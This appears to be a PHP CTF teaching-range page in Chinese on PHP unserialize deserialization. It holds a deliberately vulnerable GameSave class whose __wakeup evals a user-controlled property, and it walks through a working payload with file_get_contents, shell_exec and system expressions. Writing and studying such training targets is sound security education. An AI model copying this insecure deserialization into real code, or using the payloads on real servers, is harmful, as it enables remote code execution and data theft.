<?php
// ============================================================
// unser3 · PHP unserialize 反序列化（反序列化第三课 · PHP 8.2 版）
// ============================================================
// 漏洞点：unserialize(base64_decode(用户输入)) —— PHP 序列化串不是
//         “纯数据”，而是“对象重建指令”：unserialize 按串里的类名重建
//         对象、把每个属性的控制权交给攻击者，并在重建/销毁阶段自动
//         触发 __wakeup / __destruct —— 这就是 POP 利用链的入口。
// 考点：  ① PHP 序列化格式（O:/s:/i:）与 unserialize 的重建语义；
//         ② 回显型 POP：GameSave::__wakeup 会 eval 非空的 $patch
//            属性（“老存档兼容补丁”烂实现，等价于原版 pickle 的
//            __reduce__/REDUCE），print_r($obj) 回显重建对象带出 flag；
//         ③ 防御：JSON / HMAC 签名 / allowed_classes 白名单。
// 说明：  本题由原 Python pickle 版平移而来（原文件见 _original/）：
//         “pickle loads 执行 __reduce__ 指令” ≈ “unserialize 触发魔法
//         方法 + 属性全由存档决定”。教学点：用户可控序列化数据 → POP。
// ============================================================

class GameSave
{
    public $player = '无名玩家';
    public $level = 1;
    public $patch = '';   // “旧版本兼容补丁”：老存档自带修复表达式，重建时求值

    public function __wakeup()
    {
        // 兼容层：patch 非空则当作 PHP 表达式求值，结果写回属性。
        // 烂在根上：patch 来自存档字符串（用户可控），而本方法在
        // unserialize() 重建对象时被自动调用 —— gadget 就是它。
        if ($this->patch !== '') {
            $this->patch = eval('return ' . $this->patch . ';');   // ← 漏洞 sink
        }
    }

    public function __destruct()
    {
        // 生命周期演示：对象销毁（unset / 脚本结束 / 异常回收）时自动触发
        echo '[destruct] 玩家 ' . $this->player . '（Lv.' . $this->level . "）的存档已写回磁盘。\n";
    }
}

function e($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

$saveRaw = $_POST['save'] ?? $_GET['save'] ?? '';
$save = is_string($saveRaw) ? $saveRaw : '';   // request.values.get 只回字符串，这里对齐，防数组输入
$result = '';
if ($save !== '') {
    // 用输出缓冲把 __wakeup / __destruct 阶段的服务端输出也捕获进“加载器输出”，
    // 让学生同时看到“重建阶段执行了什么”与“析构阶段执行了什么”。
    ob_start();
    try {
        $data = base64_decode($save, true);   // 严格模式：非法 base64 返回 false
        if ($data === false || $data === '') {
            throw new RuntimeException('不是合法的 base64 数据');
        }
        $obj = @unserialize($data);           // ← 漏洞：反序列化不可信数据 = 重建任意对象 + 触发魔法方法
        if ($obj === false) {
            $result = '存档加载失败：UnserializeError: 不是合法的 PHP 序列化数据（格式如 O:8:"GameSave":1:{...}）';
        } else {
            $result = '存档加载成功！对象内容：' . print_r($obj, true);   // 回显型：重建出的对象被打印
            unset($obj);                      // 主动销毁 → 立即触发 __destruct（输出已被 ob 捕获）
        }
    } catch (Throwable $ex) {
        $result = '存档加载失败：' . get_class($ex) . ': ' . $ex->getMessage();
    }
    $tail = ob_get_clean();
    if ($tail !== '') {
        $result .= "\n[magic] 反序列化阶段的服务端输出（__wakeup/__destruct 产生）：\n" . $tail;
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>unser3 · unserialize 反序列化 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
textarea{width:100%;min-height:70px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,Menlo,monospace;font-size:12px}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">反序列化 · 第 3 关</span>
<h1>游戏存档加载器 —— PHP unserialize 反序列化</h1>
<div class="meta">难度：★★★☆☆ 中等 · 关卡 ID：<code>unser3</code> · 运行时：PHP 8.2</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>一个网页版小游戏把「存档」用 PHP <code>serialize()</code> 序列化后以 base64 存在浏览器里，读取存档时服务端 <code>unserialize()</code> 还原。页面允许你直接提交一段存档数据。</p>
<p>PHP 手册早就警告过：<i>“不要把不可信的用户输入传给 unserialize()……可能导致代码执行”</i>。想想为什么——存档里的类是 <code>GameSave</code>（源码全给出），它的 <code>__wakeup()</code> 里有一段“老存档兼容”逻辑。想办法让存档把 <b>flag_unser3.txt</b> 的内容带回来。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="post" action="">
<label>存档数据（base64 的 PHP 序列化串）：</label>
<textarea name="save" placeholder="Tzo4OiJHYW1lU2F2ZSI6..."><?= e($save) ?></textarea>
<div style="margin-top:8px"><button type="submit">加载存档</button></div>
</form>
<div class="result"><div class="t">加载器输出</div>
<pre><?= e($result) ?></pre></div>
<p style="color:var(--dim);font-size:13px">热身：提交 <code>czoyOiJhZiI7</code>（一个普通字符串 "af" 的 PHP 序列化 base64）感受一下；再用 php 亲手生成：<code>php -r "echo base64_encode(serialize('hello'));"</code></p>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>unserialize() 是什么</b>：不是 JSON 那样的“数据解码”，而是<b>对象重建</b>——按串里的类名造对象、把串里的值逐个填回属性，随后<b>自动调用</b> <code>__wakeup()</code>；对象销毁时再调用 <code>__destruct()</code>。危险的从来不是“格式”，而是“重建过程会执行代码”：魔法方法做什么、属性是什么，全由你的存档字符串决定（POP：Property-Oriented Programming）。</p>
<p><b>本题 gadget：__wakeup 里的“兼容补丁”</b>。序列化存档时游戏存过历史版本，老存档带一个 <code>patch</code> 补丁表达式，重建时被 <code>eval</code> 求值——属性用户可控，这行 eval 就成了任意表达式执行（等价于原版 pickle 的 <code>__reduce__</code>/REDUCE 指令）：</p>
<pre>class GameSave {
    public $player; public $level; public $patch;
    public function __wakeup() {
        if ($this-&gt;patch !== '')
            $this-&gt;patch = eval('return ' . $this-&gt;patch . ';');   // ← 漏洞 sink
    }
    public function __destruct() { echo "[destruct] ..."; }
}

$data = base64_decode($save);
$obj   = unserialize($data);                                // ← 重建时自动触发 __wakeup
$result = '存档加载成功！对象内容：' . print_r($obj, true);      // 回显型：重建出的对象被打印</pre>
<p><b>payload 长什么样</b>（手写串，注意长度字段必须精确）：</p>
<pre>O:8:"GameSave":3:{
  s:6:"player"; s:6:"hacker";
  s:5:"level";  i:99;
  s:5:"patch";  s:36:"file_get_contents('flag_unser3.txt')";   ← __wakeup 会 eval 它，结果写回 patch 属性
}</pre>
<p><b>常见 patch 表达式一览</b>（按场景挑）：</p>
<table>
<tr><th>patch 表达式</th><th>效果</th></tr>
<tr><td><code>file_get_contents('flag_unser3.txt')</code></td><td>读 flag 文件，返回值写回属性、被 print_r 回显（本题主解）</td></tr>
<tr><td><code>shell_exec('id')</code></td><td>执行命令并<b>返回</b>输出（回显型 RCE）</td></tr>
<tr><td><code>system('id')</code></td><td>执行命令边输出边返回最后一行（输出会出现在 [magic] 段）</td></tr>
<tr><td><code>phpversion()</code></td><td>无害探测：先确认 eval 生效</td></tr>
</table>
<p style="color:var(--dim);font-size:13px">⚠ 小坑：模板是 <code>return &lt;表达式&gt;;</code>，patch 必须是一个<b>表达式</b>——写 <code>echo 1</code>、带分号、多语句都会 ParseError（报错会回显，正好用来看引擎行为）；这与原版 pickle “reduce 元素必须可序列化”是同一类“载荷形状”限制。</p>
<p><b>与原 pickle 版的对照</b>（本题就是它的 PHP 平移）：</p>
<table>
<tr><th>原 Python pickle 版</th><th>本 PHP 版</th></tr>
<tr><td><code>pickle.loads()</code> 执行重建指令流（栈虚拟机）</td><td><code>unserialize()</code> 重建对象并自动触发 <code>__wakeup</code>/<code>__destruct</code></td></tr>
<tr><td><code>__reduce__</code> 返回 <code>(callable, args)</code>，loads 时执行</td><td>攻击者控制全部属性 + 类里存在 gadget（本题 <code>__wakeup</code> eval patch）</td></tr>
<tr><td>REDUCE 指令<b>天生</b>能调用函数（引擎即漏洞）</td><td>unserialize 本身不执行任意函数，需要应用里恰好有 gadget（POP 链）</td></tr>
<tr><td>loads 返回值被 <code>%r</code> 回显</td><td>print_r($obj) 回显重建对象（回显型 payload）</td></tr>
<tr><td>RestrictedUnpickler 白名单</td><td><code>unserialize($d, ['allowed_classes' =&gt; [...]])</code></td></tr>
</table>
</section>

<section class="card">
<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
<details><summary>提示 1：unserialize() 会“执行”什么</summary><p>重建对象后自动调用 <code>__wakeup()</code>、销毁时调用 <code>__destruct()</code>——而调用的方法体写在服务端的类里，输入的属性值全由你的存档字符串决定。看看页面给出的 <code>GameSave</code> 源码：<code>__wakeup</code> 对<b>非空的 patch 属性</b>做了什么？</p></details>
<details><summary>提示 2：怎么“生成”恶意存档</summary><p>把 patch 设为 <code>file_get_contents('flag_unser3.txt')</code>，其余属性随便填。手写 <code>O:8:"GameSave":3:{...}</code> 容易长度错，用题目目录附的 <code>gen_payload.php</code>：<code>php gen_payload.php</code> 直接输出 base64 payload（加目标 URL 参数则生成 + 提交 + 回显一条龙）。</p></details>
<details><summary>提示 3：为什么服务端会回显 flag</summary><p>题目把 <code>unserialize()</code> 重建出的对象直接 <code>print_r</code> 展示。而 <code>__wakeup</code> 已经把 eval 的返回值（flag 文件内容）写回了 <code>patch</code> 属性——所以 flag 会原样出现在“对象内容”里。跑 <code>php gen_payload.php http://127.0.0.1:5003/unser3/</code> 即可。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="/unser2">← 上一关：unser2 · POP 链</a><a href="/unser4">下一关：unser4 · phar →</a></nav>
<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=unser3&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
